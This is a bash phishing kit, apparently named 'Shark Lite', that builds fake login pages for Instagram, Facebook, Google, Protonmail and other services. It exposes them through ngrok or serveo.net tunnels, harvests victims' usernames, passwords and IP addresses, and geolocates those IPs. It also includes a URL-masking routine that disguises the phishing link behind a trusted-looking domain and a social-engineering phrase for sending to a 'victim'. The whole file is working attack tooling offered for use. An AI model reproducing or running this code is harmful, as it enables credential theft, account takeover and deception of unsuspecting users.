#!/bin/bash

trap 'printf "\n";stop;exit 1' 2


dependencies() {

command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }

}

menu() {

printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Instagram\e[0m      \e[1;92m[\e[0m\e[1;77m09\e[0m\e[1;92m]\e[0m\e[1;93m Origin\e[0m          \e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;93m Gitlab\e[0m\n"
echo
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Facebook\e[0m       \e[1;92m[\e[0m\e[1;77m10\e[0m\e[1;92m]\e[0m\e[1;93m Steam\e[0m           \e[1;92m[\e[0m\e[1;77m18\e[0m\e[1;92m]\e[0m\e[1;93m Pinterest\e[0m\n"
echo
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Snapchat\e[0m       \e[1;92m[\e[0m\e[1;77m11\e[0m\e[1;92m]\e[0m\e[1;93m Yahoo\e[0m           \e[1;92m[\e[0m\e[1;77m19\e[0m\e[1;92m]\e[0m\e[1;93m Custom\e[0m\n"
echo
printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m Twitter\e[0m        \e[1;92m[\e[0m\e[1;77m12\e[0m\e[1;92m]\e[0m\e[1;93m Linkedin\e[0m        \e[1;92m[\e[0m\e[1;77m99\e[0m\e[1;92m]\e[0m\e[1;93m Exit\e[0m\n"
echo
printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;93m Github\e[0m         \e[1;92m[\e[0m\e[1;77m13\e[0m\e[1;92m]\e[0m\e[1;93m Protonmail\e[0m\n"
echo
printf "\e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;93m Google\e[0m         \e[1;92m[\e[0m\e[1;77m14\e[0m\e[1;92m]\e[0m\e[1;93m Wordpress\e[0m\n"
echo
printf "\e[1;92m[\e[0m\e[1;77m07\e[0m\e[1;92m]\e[0m\e[1;93m Spotify\e[0m        \e[1;92m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;93m Microsoft\e[0m\n"
echo
printf "\e[1;92m[\e[0m\e[1;77m08\e[0m\e[1;92m]\e[0m\e[1;93m Netflix\e[0m        \e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;93m InstaFollowers\e[0m\n"
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m' option


if [[ $option == 1 || $option == 01 ]]; then
server="instagram"
start1

elif [[ $option == 2 || $option == 02 ]]; then
server="facebook"
start1

elif [[ $option == 3 || $option == 03 ]]; then
server="snapchat"
start1

elif [[ $option == 4 || $option == 04 ]]; then
server="twitter"
start1

elif [[ $option == 5 || $option == 05 ]]; then
server="github"
start1

elif [[ $option == 6 || $option == 06 ]]; then
server="google"
start1

elif [[ $option == 7 || $option == 07 ]]; then
server="spotify"
start1

elif [[ $option == 8 || $option == 08 ]]; then
server="netflix"
start1

elif [[ $option == 9 || $option == 09 ]]; then
server="origin"
start1

elif [[ $option == 10 ]]; then
server="steam"
start1

elif [[ $option == 11 ]]; then
server="yahoo"
start1

elif [[ $option == 12 ]]; then
server="linkedin"
start1

elif [[ $option == 13 ]]; then
server="protonmail"
start1

elif [[ $option == 14 ]]; then
server="wordpress"
start1

elif [[ $option == 15 ]]; then
server="microsoft"
start1

elif [[ $option == 16 ]]; then
server="instafollowers"
start1

elif [[ $option == 17 ]]; then
server="gitlab"
start1

elif [[ $option == 18 ]]; then
server="pinterest"
start1

elif [[ $option == 19 ]]; then
server="create"
createpage
start1

elif [[ $option == 99 ]]; then
exit 1

else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
menu
fi
}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
pkill -f -2 ssh > /dev/null 2>&1
killall ssh > /dev/null 2>&1
fi
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

}

banner()
{
  printf "`tput bold` %-40s `tput sgr0`\n" "$@"
}

banner "
█▀ █░█ ▄▀█ █▀█ █▄▀   █░░ █ ▀█▀ █▀▀
▄█ █▀█ █▀█ █▀▄ █░█   █▄▄ █ ░█░ ██▄ v.1"
echo
echo -e    "\e[1;31m[\e[0m\e[1;77mv1.0\e[0m\e[1;31m]\e[0m\e[1;77m by Mr. Bee \e[0m"
echo -e    "\e[1;31m[\e[0m\e[1;77m  © \e[0m\e[1;31m]\e[0m\e[1;77m Kali Linux\e[0m\n"


createpage() {
default_cap1="Wi-fi Session Expired"
default_cap2="Please login again."
default_user_text="Username:"
default_pass_text="Password:"
default_sub_text="Log-In"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 1 (Default: Wi-fi Session Expired): \e[0m' cap1
cap1="${cap1:-${default_cap1}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 2 (Default: Please login again.): \e[0m' cap2
cap2="${cap2:-${default_cap2}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Username field (Default: Username:): \e[0m' user_text
user_text="${user_text:-${default_user_text}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Password field (Default: Password:): \e[0m' pass_text
pass_text="${pass_text:-${default_pass_text}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Submit field (Default: Log-In): \e[0m' sub_text
sub_text="${sub_text:-${default_sub_text}}"

echo "<!DOCTYPE html>" > sites/create/login.html
echo "<html>" >> sites/create/login.html
echo "<body bgcolor=\"gray\" text=\"white\">" >> sites/create/login.html
IFS=$'\n'
printf '<center><h2> %s <br><br> %s </h2></center><center>\n' $cap1 $cap2 >> sites/create/login.html
IFS=$'\n'
printf '<form method="POST" action="login.php"><label>%s </label>\n' $user_text >> sites/create/login.html
IFS=$'\n'
printf '<input type="text" name="username" length=64>\n' >> sites/create/login.html
IFS=$'\n'
printf '<br><label>%s: </label>' $pass_text >> sites/create/login.html
IFS=$'\n'
printf '<input type="password" name="password" length=64><br><br>\n' >> sites/create/login.html
IFS=$'\n'
printf '<input value="%s" type="submit"></form>\n' $sub_text >> sites/create/login.html
printf '</center>' >> sites/create/login.html
printf '<body>\n' >> sites/create/login.html
printf '</html>\n' >> sites/create/login.html


}

catch_cred() {

account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting Next IP and Next Credentials, Press Ctrl + C to exit...\e[0m\n"

}


catch_ip() {
touch sites/$server/saved.usernames.txt
ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Target IP:\e[0m\e[1;77m %s\e[0m\n" $ip
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
cat sites/$server/ip.txt >> sites/$server/saved.ip.txt

if [[ -e iptracker.log ]]; then
rm -rf iptracker.log
fi

IFS='\n'
iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
IFS=$'\n'
continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
printf "\n"
hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
if [[ $hostnameip != "" ]]; then
printf "\e[1;92m[*] Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
fi
##

reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
if [[ $reverse_dns != "" ]]; then
printf "\e[1;92m[*] Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $reverse_dns
fi
##


if [[ $continent != "" ]]; then
printf "\e[1;92m[*] IP Continent:\e[0m\e[1;77m %s\e[0m\n" $continent
fi
##

country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
if [[ $country != "" ]]; then
printf "\e[1;92m[*] IP Country:\e[0m\e[1;77m %s\e[0m\n" $country
fi
##

state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
if [[ $state != "" ]]; then
printf "\e[1;92m[*] State:\e[0m\e[1;77m %s\e[0m\n" $state
fi
##
city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $city != "" ]]; then
printf "\e[1;92m[*] City Location:\e[0m\e[1;77m %s\e[0m\n" $city
fi
##

isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $isp != "" ]]; then
printf "\e[1;92m[*] ISP:\e[0m\e[1;77m %s\e[0m\n" $isp
fi
##

as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $as_number != "" ]]; then
printf "\e[1;92m[*] AS Number:\e[0m\e[1;77m %s\e[0m\n" $as_number
fi
##

ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $ip_speed != "" ]]; then
printf "\e[1;92m[*] IP Address Speed:\e[0m\e[1;77m %s\e[0m\n" $ip_speed
fi
##
ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $ip_currency != "" ]]; then
printf "\e[1;92m[*] IP Currency:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
fi
##
printf "\n"
rm -rf iptracker.log
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting Credentials and Next IP, Press Ctrl + C to exit...\e[0m\n"

}



serverx() {
printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
cd sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
sleep 2
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server...\e[0m\n"
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not installed. Install it. Aborting."; exit 1; }
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > sendlink ' &
printf "\n"
sleep 10
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf "\n"
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s \n' $send_link

#send_ip=$(curl -s "http://tinyurl.com/api-create.php?url=https://www.youtube.com/redirect?v=636B9Qh-fqU&redir_token=j8GGFy4s0H5jIRVfuChglne9fQB8MTU4MjM5MzM0N0AxNTgyMzA2OTQ3&event=video_description&q=$send_link" | head -n1)
#send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
#printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
printf "\n"
checkfound


}

startx() {
if [[ -e sites/$server/ip.txt ]]; then
rm -rf sites/$server/ip.txt

fi
if [[ -e sites/$server/usernames.txt ]]; then
rm -rf sites/$server/usernames.txt

fi

default_port="3333" #$(seq 1111 4444 | sort -R | head -n1)
printf '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
read port
port="${port:-${default_port}}"
serverx

}


start() {
if [[ -e sites/$server/ip.txt ]]; then
rm -rf sites/$server/ip.txt

fi
if [[ -e sites/$server/usernames.txt ]]; then
rm -rf sites/$server/usernames.txt

fi


if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi



else
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 2
printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m*\e[1;92m] Phishing URL:\e[0m\e[1;77m %s\e[0m\n" $link
#send_ip=$(curl -s "http://tinyurl.com/api-create.php?url=https://www.youtube.com/redirect?v=636B9Qh-fqU&redir_token=j8GGFy4s0H5jIRVfuChglne9fQB8MTU4MjM5MzM0N0AxNTgyMzA2OTQ3&event=video_description&q=$link" | head -n1)
#send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
#printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
printf "\n"

# Bash Script for Hide Phishing URL Created by Mr. Bee

url_checker() {
    if [ ! "${1//:*}" = http ]; then
        if [ ! "${1//:*}" = https ]; then
            echo -e "\e[31m[!] Invalid URL. Please use http or https.\e[0m"
            exit 1
        fi
    fi
}

banner()
{
  printf "`tput bold` %-40s `tput sgr0`\n" "$@"
}

banner "
𝘔𝘢𝘴𝘬𝘪𝘯𝘨 𝘗𝘩𝘪𝘴𝘩𝘪𝘯𝘨 𝘜𝘙𝘓"

echo
echo "Paste Phishing URL here (with http or https)"
echo -en "\e[32m=>\e[0m "
read phish
url_checker $phish
sleep 1
echo
echo "Processing and Modifing Phishing URL"
echo ""
short=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${phish})
shorter=${short#https://}
echo -e "Masking Domain"
echo
echo 'Example (with http or https), ex: https://google.com, http
://anything.org) :'
echo
echo -en "\e[32m=>\e[0m "
read mask
url_checker $mask
echo -e '\nType social engineering words:(like free-money, best-pubg-tricks)'
echo
echo -e "\e[31mWARRNING : Don't Use Space\e[0m"
echo
echo -en "\e[32m=>\e[0m"
read words
echo -e "\nGenerating Link...\n"
final=$mask-$words@$shorter
echo -e "Send This Link To Victim:\e[32m ${final} \e[0m\n"

checkfound
}

start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi


#printf "\n"
#printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net (SSH Tunneling, Best!)\e[0m\n"
#printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
#default_option_server="1"
#read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_server
#option_server="${option_server:-${default_option_server}}"
#if [[ $option_server == 1 || $option_server == 01 ]]; then
#startx

#elif [[ $option_server == 2 || $option_server == 02 ]]; then
start
#else
#printf "\e[1;93m [!] Invalid option!\e[0m\n"
#sleep 1
#clear
#start1
#fi

}
checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting IPs and Credentials,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "sites/$server/ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
catch_ip
rm -rf sites/$server/ip.txt
fi
sleep 0.5
if [[ -e "sites/$server/usernames.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
catch_cred
rm -rf sites/$server/usernames.txt
fi
sleep 0.5


done

}
banner
dependencies
menu
